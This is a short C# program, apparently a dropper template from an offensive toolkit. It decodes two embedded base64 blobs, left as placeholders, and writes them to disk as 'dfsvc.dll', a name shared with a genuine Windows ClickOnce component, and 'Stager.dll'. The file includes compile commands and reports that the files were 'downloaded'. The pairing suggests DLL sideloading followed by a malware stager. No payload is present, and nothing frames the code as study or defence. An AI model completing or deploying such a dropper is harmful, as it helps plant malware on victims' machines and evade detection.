//manual compile: csc /platform:x64 /target:library DLLDownloader.cs     or     csc /platform:x64 /target:exe DLLDownloader.cs

using System;
using System.IO;

namespace DllDownloader
{
    class Program
    {
        static void Main(string[] args)
        {
            // base64-encoded content of the dfsvc.dll
            string base64Content1 = "Your base64 string for dfsvc.dll here";

            // base64-encoded content of the Stager.dll
            string base64Content2 = "Your base64 string for Stager.dll here";

            // convert base64 strings to byte arrays
            byte[] fileBytes1 = Convert.FromBase64String(base64Content1);
            byte[] fileBytes2 = Convert.FromBase64String(base64Content2);

            // specify the file name
            string fileName1 = "dfsvc.dll";
            string fileName2 = "Stager.dll";

            try
            {
                // save the byte arrays to files
                File.WriteAllBytes(fileName1, fileBytes1);
                File.WriteAllBytes(fileName2, fileBytes2);

                Console.WriteLine($"DLLs '{fileName1}' and '{fileName2}' downloaded successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to download DLLs: {ex.Message}");
            }
        }
    }
}

